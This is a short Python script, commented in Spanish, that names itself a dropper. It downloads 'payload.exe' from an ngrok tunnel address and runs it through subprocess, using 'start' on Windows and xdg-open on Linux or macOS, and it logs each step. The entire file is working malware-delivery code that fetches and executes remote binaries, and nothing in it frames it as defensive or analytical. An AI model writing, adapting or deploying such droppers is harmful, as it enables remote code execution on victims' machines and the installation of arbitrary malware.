import os
import requests
import logging
import subprocess

# Configuración del registro
logging.basicConfig(
    filename='logs/dropper.log', 
    level=logging.INFO, 
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Configuración del payload
PAYLOAD_URL = 'https://hornet-alive-muskox.ngrok-free.app/payload/payload.exe'
PAYLOAD_DIR = os.path.join(os.path.dirname(__file__), '../payload')
PAYLOAD_PATH = os.path.join(PAYLOAD_DIR, 'payload.exe')

def download_payload(url, destination):
    """Descarga el payload desde la URL especificada y lo guarda en la ruta destino."""
    try:
        logging.info(f'Descargando el payload desde {url}')
        response = requests.get(url)
        response.raise_for_status()  # Lanza una excepción para códigos de error HTTP

        with open(destination, 'wb') as file:
            file.write(response.content)
        logging.info(f'Payload descargado exitosamente en {destination}')
    except requests.exceptions.RequestException as e:
        logging.error(f'Error al descargar el payload: {e}')
        raise

def run_payload(path):
    """Ejecuta el payload en la ruta especificada."""
    try:
        logging.info(f'Ejecutando el payload desde {path}')
        if os.name == 'nt':  # Windows
            subprocess.run(['start', path], shell=True)
        else:  # Linux/MacOS
            subprocess.run(['xdg-open', path], check=True)
        logging.info('Payload ejecutado exitosamente')
    except Exception as e:
        logging.error(f'Error al ejecutar el payload: {e}')
        raise

def main():
    """Función principal del dropper."""
    try:
        # Crear el directorio de payload si no existe
        os.makedirs(PAYLOAD_DIR, exist_ok=True)

        # Descargar y ejecutar el payload
        download_payload(PAYLOAD_URL, PAYLOAD_PATH)
        run_payload(PAYLOAD_PATH)
    except Exception as e:
        logging.critical(f'Error crítico en el dropper: {e}')
        print(f"Ha ocurrido un error crítico: {e}")

if __name__ == "__main__":
    main()
